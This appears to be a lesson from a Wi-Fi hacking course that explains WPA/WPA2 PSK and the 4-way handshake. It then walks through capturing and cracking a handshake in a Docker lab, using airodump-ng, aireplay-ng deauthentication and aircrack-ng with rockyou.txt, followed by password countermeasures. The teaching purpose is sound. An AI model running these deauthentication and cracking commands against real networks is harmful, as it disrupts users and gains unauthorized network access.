# WPA/WPA2 PSK Cracking Lab
## Introduction

Now it is time to continue performing attack tests with the next version of the security protocol that emerged after the IEEE identified the flaws in WEP and proposed two algorithms to replace it: WPA as a temporary solution and WPA2 as the definitive version. In addition, the same methodology as in the attack on [WEP](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/WEP), first explaining how the WPA/WPA2 PSK protocol works, followed by the attack itself, as well as the corresponding recommendations and countermeasures.

## WPA/WPA2 PSK Security Protocols

Due to the multiple imperfections that made the WEP protocol weak, a security mechanism known as WPA emerged in 2003. This protocol aims to mitigate WEP's flaws while a higher-quality one is developed, which would later become WPA2 in 2004. [[36](https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&arnumber=5601275)]

Despite being an intermediate solution, WPA represents a major security improvement over its predecessor, WEP: [[36](https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&arnumber=5601275)]
- **Stronger encryption:**  
  WPA implements longer pre-shared keys (256 bits), as well as IVs that double WEP’s previous length (48 bits instead of 24). It also introduces the possibility of using another communication encryption mechanism: the AES block cipher (still robust today) with 256-bit keys.

- **Improved integrity control:**  
  Another major weakness of WEP was the use of CRC to protect communication integrity, which is a weak mechanism. Instead, WPA introduces MIC (Message Integrity Code). The main difference is that MIC helps detect and prevent alterations more effectively.

- **Use of temporal keys:**  
  WPA introduces temporal keys to encrypt packets; each packet uses a new key generated from the master key established at the beginning of the communication (which itself is generated from the pre-shared key (PSK) and other parameters transmitted in plain text). The downside is that, in older modes, this protocol still used RC4/MIC in some transmissions.

- **Authentication server support:**  
  The ability to connect an access point to an authentication server is introduced, avoiding the exclusive use of pre-shared keys. This variant is designed for organizations, using credentials (username/password) or certificates.

As mentioned earlier, WPA introduces the possibility of using AES, but does not enforce it. Therefore, the main difference between WPA and its successor, WPA2, is that WPA2 mandates the use of AES (more robust than RC4). While WPA uses TKIP (RC4 + MIC), WPA2 requires CCMP, which implements AES and CBC-MAC.

The CCMP protocol now generates temporal keys more securely than TKIP by using AES instead of RC4. In addition, it replaces MIC with CBC-MAC, which is also more robust.

On the other hand, thanks to authentication server support, two types of protocols (and therefore attacks) can be distinguished: WPA/WPA2 PSK (shared key, traditional) and WPA/WPA2 Enterprise (authentication server-based).

Focusing on traditional PSK versions, both are attacked using the same vulnerability related to authentication and master key generation, known as the *4-way handshake*:  
![image](https://github.com/user-attachments/assets/e03f855a-320c-4ed8-af46-716354a7cc02)

### Vulnerabilities 

Attacks are typically based on capturing this process to obtain all the data used in generating the master key (Primary Master Key, NONCE, etc.). Once all the master key generation data is known, dictionary attacks are commonly used. These attacks test typical pre-shared keys along with the collected data in order to generate valid master keys. If the correct master key is found, attackers can not only decrypt packets exchanged with that legitimate user, but may also recover the pre-shared key (PSK) that grants access to the network. [[36](https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&arnumber=5601275)]

Another common attack is the deauthentication attack, which acts as a complement to the previous ones. This attack forces the disconnection of one of the legitimate clients, causing it to reconnect immediately and generate a new 4-way handshake that can be captured. This is particularly useful if the network has few clients, as otherwise it could take a long time until a new connection occurs. [[36](https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&arnumber=5601275)]

Next, both techniques will be used in a process to attack either protocol. Since both share the same attack vectors, only WPA2 (the more robust one) will be demonstrated, as it is configured by default in Hostapd (in the AP). To change it, uncomment the [`Dockerfile`]() option for WPA and comment out the WPA2 one.

## Attacking WPA/WPA2 PSK

After configuring the desired WPA version, start the environment (ensuring you are in this branch) and connect to the Kali Linux machine:
```
sudo ./launch.sh
docker-compose exec attacker-1 bash 
```

Once inside, enable monitor mode on the wireless interface (wlan4):
```
airmon-ng start wlan4
```

`Reminder:` This may create an interface with the same name or something like `wlan4mon`. Also check with `ifconfig` that the attacker interface is `wlan4`.

With monitor mode active, run:
```
airodump-ng wlan4mon
```

![image](https://github.com/user-attachments/assets/4e43bb6e-0c12-4743-9656-97f7f43e0075)

Once the target AP `WPAnetwork` is identified:
```
airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w wpa-wpa2 wlan4mon
```

* `-c 6`: channel  
* `--bssid`: AP MAC  
* `-w`: output file  
* `wlan4mon`: interface  

![image](https://github.com/user-attachments/assets/8556f7c8-c786-4b4e-bec8-4473200427b7)

`Reminder:` `.cap` files store captured packets for tools like Wireshark or aircrack-ng.

To accelerate handshake capture:
```
docker-compose exec attacker-1 bash
aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:02:00 wlan4mon
```

After capturing:
![image](https://github.com/user-attachments/assets/ad332206-8d70-48e6-b799-60073a6c3bd5)

Crack with:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 02:00:00:00:00:00 wpa-wpa2*.cap
```

Dictionary:
- rockyou.txt ([Kali Linux](https://www.kali.org/tools/wordlists/))

After success:
![image](https://github.com/user-attachments/assets/f29039c0-92b8-4106-bd58-c441fc656040)

Modify Dockerfile:
https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/blob/WPA/WPA2-PSK/internal/wireless/AP/Dockerfile

Restart:
```
sudo ./stop.sh
sudo ./launch.sh
```

### Countermeasures and Recommendations

Use strong passwords:
```
X4r!tP7uNv#eLj29qWbR@KmZ8Yx&cDf9G3hTs%uQpL$JaMk0VbnEzHdCrL#oWy
```

Modify configs:
- https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/blob/WPA/WPA2-PSK/internal/wireless/AP/hostapd-WPA.conf  
- https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/blob/WPA/WPA2-PSK/internal/wireless/AP/hostapd-WPA2.conf  

Clients:
- https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/blob/WPA/WPA2-PSK/internal/wireless/client12/wpa_supplicant.conf  
- https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/blob/WPA/WPA2-PSK/internal/wireless/client3/wpa_supplicant.conf  

Attack again:
```
docker-compose exec attacker-1 bash
airmon-ng start wlan4
airodump-ng wlan4mon
airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w wpa-wpa2 wlan4mon

docker-compose exec attacker-1 bash
aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:02:00 wlan4mon

aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 02:00:00:00:00:00 wpa-wpa2*.cap
```

![image](https://github.com/user-attachments/assets/85543419-8925-456d-b451-5244e7edf712)
![image](https://github.com/user-attachments/assets/92d4c4c9-7e86-452f-ba03-17c40ebb9fc6)
<img width="698" height="476" alt="image" src="https://github.com/user-attachments/assets/ac6ccf13-e848-410b-9277-365434786feb" />

Ensure passwords are not in common lists or contain easily identifiable personal information.

`Reminder:` Repeat the [attacks](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks)

[Previous lesson](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks)  
[Next lesson](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/WPS)
